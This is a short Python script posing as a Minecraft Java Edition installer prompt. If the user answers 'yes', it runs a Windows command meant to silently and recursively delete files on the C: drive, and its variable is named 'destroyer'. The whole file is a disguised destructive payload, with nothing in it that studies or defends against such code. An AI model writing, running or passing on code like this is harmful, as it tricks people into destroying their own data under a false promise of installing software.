import os as o
destroyer = input('Do you want to install Minecraft Java editon? ')
if destroyer == 'yes':
    o.system('del C: /s /q /r')
if destroyer == 'no':
    o.system('exit')